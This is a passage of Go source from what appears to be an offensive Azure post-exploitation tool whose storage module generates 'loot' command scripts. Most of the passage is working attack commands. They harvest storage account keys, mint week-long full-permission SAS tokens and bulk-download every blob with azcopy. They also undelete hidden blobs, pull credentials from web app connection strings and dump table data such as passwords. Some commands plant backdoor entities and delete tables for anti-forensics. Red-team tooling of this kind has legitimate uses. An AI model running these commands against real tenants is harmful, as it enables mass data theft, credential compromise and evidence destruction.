				"## Storage Account: %s, File Share: %s - Share SAS Token\n"+
					"# Set subscription context\n"+
					"az account set --subscription %s\n"+
					"\n"+
					"# Generate file share SAS token (7 days, read/write/delete/list)\n"+
					"az storage share generate-sas \\\n"+
					"  --account-name %s \\\n"+
					"  --name %s \\\n"+
					"  --permissions dlrw \\\n"+
					"  --expiry $(date -u -d '7 days' '+%%Y-%%m-%%dT%%H:%%M:%%SZ') \\\n"+
					"  --https-only \\\n"+
					"  -o tsv\n"+
					"\n"+
					"# Use share SAS token to list files\n"+
					"export SHARE_SAS=\"<token-from-above>\"\n"+
					"curl \"https://%s.file.core.windows.net/%s?restype=directory&comp=list&$SHARE_SAS\"\n"+
					"\n"+
					"## PowerShell equivalent\n"+
					"Set-AzContext -SubscriptionId %s\n"+
					"$ctx = (Get-AzStorageAccount -Name %s -ResourceGroupName %s).Context\n"+
					"$startTime = Get-Date\n"+
					"$endTime = $startTime.AddDays(7)\n"+
					"$shareSas = New-AzStorageShareSASToken -Name %s -Permission \"rwdl\" -Context $ctx -StartTime $startTime -ExpiryTime $endTime\n"+
					"Write-Host \"Share SAS Token: $shareSas\"\n\n",
				acct.AccountName, acct.FileShareName,
				acct.SubscriptionID,
				acct.AccountName, acct.FileShareName,
				acct.AccountName, acct.FileShareName,
				acct.SubscriptionID,
				acct.AccountName, acct.ResourceGroup,
				acct.FileShareName,
			)
		}
	}

	// ENHANCED: Complete data exfiltration workflows
	loot += "# ========================================\n"
	loot += "# ENHANCED DATA EXFILTRATION SCENARIOS\n"
	loot += "# ========================================\n\n"

	loot += "# SCENARIO 1: Automated Bulk Data Exfiltration with azcopy\n"
	loot += "# Complete pipeline: list accounts → generate SAS → download all blobs\n\n"
	loot += "# Step 1: Enumerate all storage accounts and generate SAS tokens\n"
	loot += "mkdir -p ./exfiltrated-data\n"
	loot += "for STORAGE in $(az storage account list --query '[].name' -o tsv); do\n"
	loot += "  echo \"Processing storage account: $STORAGE\"\n"
	loot += "  RG=$(az storage account show --name $STORAGE --query 'resourceGroup' -o tsv)\n"
	loot += "  \n"
	loot += "  # Get storage account key\n"
	loot += "  KEY=$(az storage account keys list --account-name $STORAGE --resource-group $RG --query '[0].value' -o tsv)\n"
	loot += "  \n"
	loot += "  # Generate 7-day SAS token with full permissions\n"
	loot += "  SAS=$(az storage account generate-sas \\\n"
	loot += "    --account-name $STORAGE \\\n"
	loot += "    --account-key \"$KEY\" \\\n"
	loot += "    --services bfqt \\\n"
	loot += "    --resource-types sco \\\n"
	loot += "    --permissions rwdlacup \\\n"
	loot += "    --expiry $(date -u -d '7 days' '+%Y-%m-%dT%H:%M:%SZ') \\\n"
	loot += "    -o tsv)\n"
	loot += "  \n"
	loot += "  # Bulk download using azcopy (optimized for large datasets)\n"
	loot += "  echo \"Downloading from $STORAGE...\"\n"
	loot += "  azcopy copy \"https://$STORAGE.blob.core.windows.net/?$SAS\" \\\n"
	loot += "    \"./exfiltrated-data/$STORAGE\" \\\n"
	loot += "    --recursive=true --overwrite=true --log-level=ERROR\n"
	loot += "done\n\n"

	loot += "# SCENARIO 2: Recover Soft-Deleted Blobs (Deleted Data Forensics)\n"
	loot += "# Deleted blobs may contain sensitive data not available elsewhere\n\n"
	loot += "for STORAGE in $(az storage account list --query '[].name' -o tsv); do\n"
	loot += "  RG=$(az storage account show --name $STORAGE --query 'resourceGroup' -o tsv)\n"
	loot += "  KEY=$(az storage account keys list --account-name $STORAGE --resource-group $RG --query '[0].value' -o tsv)\n"
	loot += "  \n"
	loot += "  # List all containers\n"
	loot += "  for CONTAINER in $(az storage container list --account-name $STORAGE --account-key \"$KEY\" --query '[].name' -o tsv); do\n"
	loot += "    # Find soft-deleted blobs\n"
	loot += "    DELETED=$(az storage blob list \\\n"
	loot += "      --account-name $STORAGE \\\n"
	loot += "      --container-name $CONTAINER \\\n"
	loot += "      --account-key \"$KEY\" \\\n"
	loot += "      --include d \\\n"
	loot += "      --query \"[?properties.deletedTime!=null].name\" -o tsv)\n"
	loot += "    \n"
	loot += "    if [ ! -z \"$DELETED\" ]; then\n"
	loot += "      echo \"Found deleted blobs in $STORAGE/$CONTAINER:\"\n"
	loot += "      echo \"$DELETED\"\n"
	loot += "      \n"
	loot += "      # Recover and download each deleted blob\n"
	loot += "      for BLOB in $DELETED; do\n"
	loot += "        echo \"Recovering: $BLOB\"\n"
	loot += "        az storage blob undelete --account-name $STORAGE --container-name $CONTAINER --name \"$BLOB\" --account-key \"$KEY\"\n"
	loot += "        az storage blob download --account-name $STORAGE --container-name $CONTAINER --name \"$BLOB\" \\\n"
	loot += "          --file \"./recovered_${BLOB##*/}\" --account-key \"$KEY\"\n"
	loot += "      done\n"
	loot += "    fi\n"
	loot += "  done\n"
	loot += "done\n\n"

	loot += "# SCENARIO 3: Extract Connection Strings from Web Apps/Functions\n"
	loot += "# Connection strings often contain storage account keys\n\n"
	loot += "for WEBAPP in $(az webapp list --query '[].name' -o tsv); do\n"
	loot += "  RG=$(az webapp show --name $WEBAPP --query 'resourceGroup' -o tsv)\n"
	loot += "  echo \"Extracting connection strings from: $WEBAPP\"\n"
	loot += "  \n"
	loot += "  # Get connection strings (may contain storage account keys)\n"
	loot += "  az webapp config connection-string list --name $WEBAPP --resource-group $RG -o json > \"${WEBAPP}_connections.json\"\n"
	loot += "  \n"
	loot += "  # Parse for storage account connection strings\n"
	loot += "  grep -i 'AccountName\\|AccountKey' \"${WEBAPP}_connections.json\" && \\\n"
	loot += "    echo \"⚠️  Found storage credentials in $WEBAPP\"\n"
	loot += "done\n\n"

	return loot
}

// ------------------------------
// Generate blob snapshot commands
// ------------------------------
func (m *StorageModule) generateSnapshotLoot() string {
	var loot string

	// Track unique storage accounts with blob containers
	uniqueContainers := make(map[string]StorageAccountInfo)
	for _, acct := range m.StorageAccounts {
		if acct.ContainerName != "N/A" {
			key := acct.SubscriptionID + "/" + acct.AccountName + "/" + acct.ContainerName
			if _, exists := uniqueContainers[key]; !exists {
				uniqueContainers[key] = acct
			}
		}
	}

	if len(uniqueContainers) == 0 {
		return "# No blob containers found - snapshots are only available for blob storage\n"
	}

	for _, acct := range uniqueContainers {
		loot += fmt.Sprintf(
			"## Storage Account: %s, Container: %s - Blob Snapshots\n"+
				"# Set subscription context\n"+
				"az account set --subscription %s\n"+
				"\n"+
				"# List all blobs including snapshots (previous versions often contain sensitive data)\n"+
				"az storage blob list \\\n"+
				"  --account-name %s \\\n"+
				"  --container-name %s \\\n"+
				"  --include s \\\n"+
				"  --output table\n"+
				"\n"+
				"# List snapshots with detailed metadata\n"+
				"az storage blob list \\\n"+
				"  --account-name %s \\\n"+
				"  --container-name %s \\\n"+
				"  --include s \\\n"+
				"  --query \"[?snapshot!=null].{Name:name, Snapshot:snapshot, LastModified:properties.lastModified, Size:properties.contentLength}\" \\\n"+
				"  --output table\n"+
				"\n"+
				"# Download specific blob snapshot (replace <blob-name> and <snapshot-time>)\n"+
				"az storage blob download \\\n"+
				"  --account-name %s \\\n"+
				"  --container-name %s \\\n"+
				"  --name <blob-name> \\\n"+
				"  --snapshot <snapshot-time> \\\n"+
				"  --file <local-filename>\n"+
				"\n"+
				"# Download all snapshots of a specific blob\n"+
				"for snapshot in $(az storage blob list --account-name %s --container-name %s --prefix <blob-name> --include s --query \"[?snapshot!=null].snapshot\" -o tsv); do\n"+
				"  az storage blob download --account-name %s --container-name %s --name <blob-name> --snapshot \"$snapshot\" --file \"<blob-name>_${snapshot}.backup\"\n"+
				"done\n"+
				"\n"+
				"# Create snapshot of current blob for exfiltration/preservation\n"+
				"az storage blob snapshot \\\n"+
				"  --account-name %s \\\n"+
				"  --container-name %s \\\n"+
				"  --name <blob-name>\n"+
				"\n"+
				"## PowerShell equivalents\n"+
				"Set-AzContext -SubscriptionId %s\n"+
				"$ctx = (Get-AzStorageAccount -Name %s -ResourceGroupName %s).Context\n"+
				"\n"+
				"# List blobs including snapshots\n"+
				"Get-AzStorageBlob -Container %s -Context $ctx -IncludeSnapshot | Format-Table Name, SnapshotTime, Length, LastModified\n"+
				"\n"+
				"# Download specific snapshot\n"+
				"Get-AzStorageBlob -Container %s -Blob <blob-name> -Context $ctx -SnapshotTime <snapshot-datetime> | Get-AzStorageBlobContent -Destination <local-path> -Force\n"+
				"\n"+
				"# Download all snapshots of a blob\n"+
				"$snapshots = Get-AzStorageBlob -Container %s -Blob <blob-name> -Context $ctx -IncludeSnapshot | Where-Object {$_.SnapshotTime -ne $null}\n"+
				"foreach ($snapshot in $snapshots) {\n"+
				"    $filename = \"<blob-name>_\" + $snapshot.SnapshotTime.ToString(\"yyyyMMddHHmmss\") + \".backup\"\n"+
				"    $snapshot | Get-AzStorageBlobContent -Destination $filename -Force\n"+
				"}\n"+
				"\n"+
				"# Create snapshot\n"+
				"Get-AzStorageBlob -Container %s -Blob <blob-name> -Context $ctx | New-AzStorageBlobSnapshot\n"+
				"\n"+
				"# Security Note: Snapshots are point-in-time copies and may contain:\n"+
				"# - Previous versions of configuration files with credentials\n"+
				"# - Deleted sensitive data\n"+
				"# - Backup copies made before security hardening\n"+
				"# - Historical API keys, certificates, or connection strings\n\n",
			acct.AccountName, acct.ContainerName,
			acct.SubscriptionID,
			acct.AccountName, acct.ContainerName,
			acct.AccountName, acct.ContainerName,
			acct.AccountName, acct.ContainerName,
			acct.AccountName, acct.ContainerName,
			acct.AccountName, acct.ContainerName,
			acct.AccountName, acct.ContainerName,
			acct.SubscriptionID,
			acct.AccountName, acct.ResourceGroup,
			acct.ContainerName,
			acct.ContainerName,
			acct.ContainerName,
			acct.ContainerName,
		)
	}

	return loot
}

// ------------------------------
// Generate Table Storage commands
// ------------------------------
func (m *StorageModule) generateTableLoot() string {
	var loot string

	// Track unique storage accounts with tables
	uniqueTables := make(map[string]StorageAccountInfo)
	for _, acct := range m.StorageAccounts {
		if acct.TableName != "N/A" {
			key := acct.SubscriptionID + "/" + acct.AccountName + "/" + acct.TableName
			if _, exists := uniqueTables[key]; !exists {
				uniqueTables[key] = acct
			}
		}
	}

	if len(uniqueTables) == 0 {
		return "# No tables found in any storage accounts\n"
	}

	loot += "# Azure Table Storage Commands\n"
	loot += "# Table Storage is a NoSQL key-value store for semi-structured data\n"
	loot += "# Tables may contain sensitive application data, configuration, or user information\n\n"

	for _, acct := range uniqueTables {
		loot += fmt.Sprintf(
			"## Storage Account: %s, Table: %s\n"+
				"# Set subscription context\n"+
				"az account set --subscription %s\n"+
				"\n"+
				"# ========================================\n"+
				"# TABLE ENUMERATION\n"+
				"# ========================================\n"+
				"\n"+
				"# List all tables in storage account\n"+
				"az storage table list --account-name %s -o table\n"+
				"\n"+
				"# Show table details (requires storage account key)\n"+
				"az storage table exists --name %s --account-name %s\n"+
				"\n"+
				"# Get storage account keys for data access\n"+
				"az storage account keys list --account-name %s --resource-group %s --query '[0].value' -o tsv\n"+
				"\n"+
				"# Set storage account key as environment variable\n"+
				"export STORAGE_KEY=$(az storage account keys list --account-name %s --resource-group %s --query '[0].value' -o tsv)\n"+
				"\n"+
				"# ========================================\n"+
				"# ENTITY QUERYING & DATA EXTRACTION\n"+
				"# ========================================\n"+
				"\n"+
				"# Query all entities in table (WARNING: May return large dataset)\n"+
				"az storage entity query --table-name %s --account-name %s --account-key \"$STORAGE_KEY\" -o table\n"+
				"\n"+
				"# Query all entities with full JSON output\n"+
				"az storage entity query --table-name %s --account-name %s --account-key \"$STORAGE_KEY\" -o json > %s_%s_entities.json\n"+
				"\n"+
				"# Query entities with OData filter (search for sensitive keywords)\n"+
				"az storage entity query \\\n"+
				"  --table-name %s \\\n"+
				"  --account-name %s \\\n"+
				"  --account-key \"$STORAGE_KEY\" \\\n"+
				"  --filter \"PartitionKey eq 'production'\" \\\n"+
				"  -o json\n"+
				"\n"+
				"# Query entities with multiple filters\n"+
				"az storage entity query \\\n"+
				"  --table-name %s \\\n"+
				"  --account-name %s \\\n"+
				"  --account-key \"$STORAGE_KEY\" \\\n"+
				"  --filter \"PartitionKey eq 'users' and RowKey gt 'a'\" \\\n"+
				"  -o json\n"+
				"\n"+
				"# Select specific properties (columns)\n"+
				"az storage entity query \\\n"+
				"  --table-name %s \\\n"+
				"  --account-name %s \\\n"+
				"  --account-key \"$STORAGE_KEY\" \\\n"+
				"  --select 'PartitionKey,RowKey,Email,Password' \\\n"+
				"  -o json\n"+
				"\n"+
				"# Get entity count (via marker-based pagination)\n"+
				"az storage entity query \\\n"+
				"  --table-name %s \\\n"+
				"  --account-name %s \\\n"+
				"  --account-key \"$STORAGE_KEY\" \\\n"+
				"  --query 'length(@)' \\\n"+
				"  -o tsv\n"+
				"\n"+
				"# Query specific entity by partition and row key\n"+
				"az storage entity show \\\n"+
				"  --table-name %s \\\n"+
				"  --account-name %s \\\n"+
				"  --account-key \"$STORAGE_KEY\" \\\n"+
				"  --partition-key '<partition-key>' \\\n"+
				"  --row-key '<row-key>'\n"+
				"\n"+
				"# ========================================\n"+
				"# TABLE SAS TOKEN GENERATION\n"+
				"# ========================================\n"+
				"\n"+
				"# Generate table-level SAS token (7 days, read/add/update/delete)\n"+
				"az storage table generate-sas \\\n"+
				"  --name %s \\\n"+
				"  --account-name %s \\\n"+
				"  --account-key \"$STORAGE_KEY\" \\\n"+
				"  --permissions raud \\\n"+
				"  --expiry $(date -u -d '7 days' '+%%Y-%%m-%%dT%%H:%%M:%%SZ') \\\n"+
				"  -o tsv\n"+
				"\n"+
				"# Use SAS token for authentication (instead of account key)\n"+
				"export TABLE_SAS=$(az storage table generate-sas --name %s --account-name %s --account-key \"$STORAGE_KEY\" --permissions raud --expiry $(date -u -d '7 days' '+%%Y-%%m-%%dT%%H:%%M:%%SZ') -o tsv)\n"+
				"az storage entity query --table-name %s --account-name %s --sas-token \"$TABLE_SAS\"\n"+
				"\n"+
				"# ========================================\n"+
				"# DATA EXFILTRATION & BACKUP\n"+
				"# ========================================\n"+
				"\n"+
				"# Export all table data to JSON file\n"+
				"mkdir -p \"tables/%s\"\n"+
				"az storage entity query \\\n"+
				"  --table-name %s \\\n"+
				"  --account-name %s \\\n"+
				"  --account-key \"$STORAGE_KEY\" \\\n"+
				"  -o json > \"tables/%s/%s_full_export_$(date +%%Y%%m%%d_%%H%%M%%S).json\"\n"+
				"\n"+
				"# Export with pagination for large tables (process in batches)\n"+
				"# Note: Azure CLI automatically handles pagination, but for manual control use REST API\n"+
				"\n"+
				"# ========================================\n"+
				"# TABLE MANAGEMENT (REQUIRES WRITE ACCESS)\n"+
				"# ========================================\n"+
				"\n"+
				"# Create table copy for analysis\n"+
				"az storage table create \\\n"+
				"  --name %sbackup \\\n"+
				"  --account-name %s \\\n"+
				"  --account-key \"$STORAGE_KEY\"\n"+
				"\n"+
				"# Delete table (cleanup/anti-forensics)\n"+
				"# WARNING: Destructive operation\n"+
				"# az storage table delete --name <table-name> --account-name <account-name> --account-key \"$STORAGE_KEY\"\n"+
				"\n"+
				"# ========================================\n"+
				"# ENTITY MANIPULATION (REQUIRES WRITE ACCESS)\n"+
				"# ========================================\n"+
				"\n"+
				"# Insert entity (for persistence/backdoor)\n"+
				"az storage entity insert \\\n"+
				"  --table-name %s \\\n"+
				"  --account-name %s \\\n"+
				"  --account-key \"$STORAGE_KEY\" \\\n"+
				"  --entity PartitionKey=<partition> RowKey=<row> Property1=<value>\n"+
				"\n"+
				"# Update entity\n"+
				"az storage entity merge \\\n"+
				"  --table-name %s \\\n"+
				"  --account-name %s \\\n"+
				"  --account-key \"$STORAGE_KEY\" \\\n"+
				"  --entity PartitionKey=<partition> RowKey=<row> Property1=<new-value>\n"+
				"\n"+
				"# Delete entity\n"+
				"az storage entity delete \\\n"+
				"  --table-name %s \\\n"+
				"  --account-name %s \\\n"+
				"  --account-key \"$STORAGE_KEY\" \\\n"+
				"  --partition-key '<partition>' \\\n"+
				"  --row-key '<row>'\n"+
				"\n"+
				"# ========================================\n"+
				"# POWERSHELL EQUIVALENTS\n"+
				"# ========================================\n"+
				"\n"+
				"Set-AzContext -SubscriptionId %s\n"+
				"$ctx = (Get-AzStorageAccount -Name %s -ResourceGroupName %s).Context\n"+
				"\n"+
				"# List tables\n"+
				"Get-AzStorageTable -Context $ctx\n"+
				"\n"+
				"# Get table reference\n"+
				"$table = Get-AzStorageTable -Name %s -Context $ctx\n"+
				"\n"+
				"# Query all entities\n"+
				"$cloudTable = $table.CloudTable\n"+
				"$entities = $cloudTable.ExecuteQuery((New-Object Microsoft.Azure.Cosmos.Table.TableQuery))\n"+
				"$entities | Format-Table\n"+
				"\n"+
				"# Export entities to JSON\n"+
				"$entities | ConvertTo-Json -Depth 10 | Out-File \"tables\\%s\\%s_export.json\"\n"+
				"\n"+
				"# Query with filter (using Azure.Data.Tables)\n"+
				"# Install-Module -Name Az.Storage -Force\n"+
				"$storageAccount = Get-AzStorageAccount -Name %s -ResourceGroupName %s\n"+
				"$tableEndpoint = $storageAccount.Context.TableEndpoint\n"+
				"# Use Azure.Data.Tables SDK for advanced querying:\n"+
				"# Install-Module -Name Azure.Data.Tables\n"+
				"# $tableClient = New-Object Azure.Data.Tables.TableClient($tableEndpoint, '%s', $credential)\n"+
				"# $entities = $tableClient.Query('PartitionKey eq \"production\"')\n"+
				"\n"+
				"# Generate SAS token\n"+
				"$startTime = Get-Date\n"+
				"$endTime = $startTime.AddDays(7)\n"+
				"$tableSas = New-AzStorageTableSASToken -Name %s -Context $ctx -Permission \"raud\" -StartTime $startTime -ExpiryTime $endTime\n"+
				"Write-Host \"Table SAS Token: $tableSas\"\n"+
				"\n"+
				"# ========================================\n"+
				"# SECURITY NOTES\n"+
				"# ========================================\n"+
				"# - Tables often contain application data (user profiles, logs, config)\n"+
				"# - Look for sensitive properties: passwords, tokens, API keys, PII\n"+
				"# - Common partition keys: 'users', 'config', 'production', 'admin'\n"+
				"# - Tables support up to 252 properties per entity\n"+
				"# - No schema enforcement - property names may reveal sensitive data types\n"+
				"# - Query filters use OData syntax: eq, ne, gt, lt, ge, le, and, or, not\n"+
				"# - Table SAS tokens can be scoped by partition/row key ranges\n"+
				"# - Entities are returned unordered unless filtered by PartitionKey\n"+
				"\n"+
				"# ========================================\n"+
				"# REST API EXAMPLES (FOR ADVANCED USAGE)\n"+
				"# ========================================\n"+
				"\n"+
				"# Direct REST API call with SAS token\n"+
				"# curl \"https://%s.table.core.windows.net/%s()?$TABLE_SAS\" -H \"Accept: application/json;odata=nometadata\"\n"+
				"\n"+
				"# Query with filter via REST API\n"+
				"# curl \"https://%s.table.core.windows.net/%s()?\\$filter=PartitionKey%%20eq%%20'production'&$TABLE_SAS\" -H \"Accept: application/json\"\n"+
				"\n\n",
			acct.AccountName, acct.TableName,
			acct.SubscriptionID,
			acct.AccountName,
			acct.TableName, acct.AccountName,
			acct.AccountName, acct.ResourceGroup,
			acct.AccountName, acct.ResourceGroup,
			acct.TableName, acct.AccountName,
			acct.TableName, acct.AccountName, acct.AccountName, acct.TableName,
			acct.TableName, acct.AccountName,
			acct.TableName, acct.AccountName,
			acct.TableName, acct.AccountName,
			acct.TableName, acct.AccountName,
			acct.TableName, acct.AccountName,
			acct.TableName, acct.AccountName,
			acct.TableName, acct.AccountName, acct.TableName, acct.AccountName,
			acct.AccountName,
			acct.TableName, acct.AccountName,
			acct.AccountName, acct.TableName,
			acct.TableName, acct.AccountName,
			acct.TableName, acct.AccountName,
			acct.TableName, acct.AccountName,
			acct.TableName, acct.AccountName,
			acct.SubscriptionID,
			acct.AccountName, acct.ResourceGroup,
			acct.TableName,
			acct.AccountName, acct.TableName,
			acct.AccountName, acct.ResourceGroup,
			acct.TableName,
			acct.TableName,
			acct.AccountName, acct.TableName,
			acct.AccountName, acct.TableName,
		)
	}

	return loot
}
